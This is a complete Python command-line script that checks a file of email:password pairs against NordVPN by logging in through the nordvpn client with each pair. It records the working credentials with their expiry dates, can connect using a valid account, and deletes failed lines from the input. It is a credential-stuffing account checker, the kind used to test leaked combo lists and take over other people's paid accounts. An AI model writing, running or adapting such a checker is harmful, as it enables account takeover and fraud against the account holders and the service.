import os
import subprocess
import sys
import argparse
from typing import Union

# console colors
G = "\033[92m"  # Green
W = "\033[93m"  # Warning (yellow)
R = "\033[91m"  # Red
E = "\033[0m"  # Erase (the default color)
B = "\033[34m"  # Blue
BOLD = "\033[1m"
UNDERLINE = "\033[4m"


def read_arguments():

    parser = argparse.ArgumentParser(description="Check NordVPN login")

    parser.add_argument(
        "-f",
        "--file",
        help="The file that contains your email:password entries",
        action="store",
        required=True,
        metavar="FILE",
    )

    parser.add_argument(
        "-o",
        "--output",
        help="The file to output the successful email:password entries to",
        action="store",
        required=True,
        metavar="FILE",
    )

    parser.add_argument("-c", "--connect", help="login & connect", action="store_true")

    parser.add_argument(
        "-d",
        "--delete",
        help="remove faulty password lines in input-file",
        action="store_true",
    )

    return parser.parse_args()


def cmd_exists(cmd, path=None):
    """test if path contains an executable file with name."""
    if path is None:
        path = os.environ["PATH"].split(os.pathsep)

    for prefix in path:
        filename = os.path.join(prefix, cmd)
        executable = os.access(filename, os.X_OK)
        is_not_directory = os.path.isfile(filename)
        if executable and is_not_directory:
            return True
    return False


def check_login(email: str, password: str, infile: str) -> Union["False", None, str]:
    # make sure you're logged out of NordVPN
    subprocess.run(["nordvpn", "logout"], capture_output=True)

    login_result = subprocess.run(
        ["nordvpn", "login", "--username", email, "--password", password],
        capture_output=True,
        text=True,
    )

    if not login_result.returncode == 0:
        # Failed to login
        if login_result.stdout.find("password is not correct") != -1:
            if args.delete and cmd_exists("sed"):
                # remove account line when password is incorrect
                cmd = ["sed", "-i", "/{e}/d".format(e=email), infile]
                subprocess.run(cmd, capture_output=False)
                return "Removed"
        return False
    else:
        # Ensure the user is logged in
        account_info = subprocess.run(
            ["nordvpn", "account"], capture_output=True, text=True
        )
        if "You are not logged in." in account_info.stdout:
            return None
        else:
            return account_info.stdout


def parse_expiration_date(login_result: str) -> str:
    return login_result.split("VPN Service: ")[1].rstrip()


def read_file(args) -> None:
    input_file_path = args.file
    output_file_path = args.output

    if not os.path.isfile(input_file_path):
        print("The path specified does not exist", input_file_path)
        sys.exit()

    # check if the specified file is empty
    if os.stat(input_file_path).st_size == 0:
        print("The file specified is empty.")
        sys.exit()

    with open(input_file_path) as f:
        count = 0
        for line in f:
            if not line.strip():  # ignore empty lines in file
                continue
            email, password = line.strip().split(":")[:2]
            if password.find(" ") != -1:
                password = password.split(" ", 1)[0]

            count += 1

            if count > 50:
                print("Limit set to 50 accounts")
                sys.exit()

            templated_account = f"{B}{count}) Checking ➜ {W}{email}:{password}{E}"
            templated_account = templated_account.ljust(70)
            print(f"{templated_account}\r", end="")

            login_result = check_login(email, password, input_file_path)

            if not login_result:
                # Failed to login
                print(templated_account, R + "Failed" + E)
            elif login_result is None:
                # No response from NordVPN
                print(templated_account, R + "No response" + E)
            elif login_result.find("Removed") != -1:
                # Password incorrect and line was removed in input file
                print(templated_account, R + "Password incorrect", E + "(removed)")
            elif login_result.find("having trouble reaching our servers") != -1:
                # No response from NordVPN
                print(templated_account, R + "No response from NVPN servers" + E)
            else:
                account_expiration_date = parse_expiration_date(login_result)
                print(templated_account, G + account_expiration_date + E)
                if args.output:
                    append_to_output_file(output_file_path, f"{email}:{password}")
                if args.connect:
                    print(BOLD + "\tConnecting..." + E)
                    timeout = False
                    try:
                        subprocess.run(
                            ["nordvpn", "c"], capture_output=False, timeout=10
                        )
                    except subprocess.TimeoutExpired:
                        print(R + "\nConnection timeout" + E)
                        timeout = True
                    if not timeout:
                        print(UNDERLINE + G + "Enjoy!" + E)
                        sys.exit()


# Appends not existing username:password entry to the specified output file
def append_to_output_file(file_path: str, entry: str) -> None:
    with open(file_path) as output_file:
        if entry in output_file.read():
            print("\tAlready present in output file")
        else:
            with open(file_path, "a") as output_file:
                output_file.write(entry + "\r\n")


if __name__ == "__main__":
    args = read_arguments()

    if not cmd_exists("nordvpn"):
        print(R + "\n...First install nordvpn..." + E)
        sys.exit()

    # Initialize the script
    try:
        read_file(args)
    except KeyboardInterrupt:
        print(R + "\nQuitting..." + E)
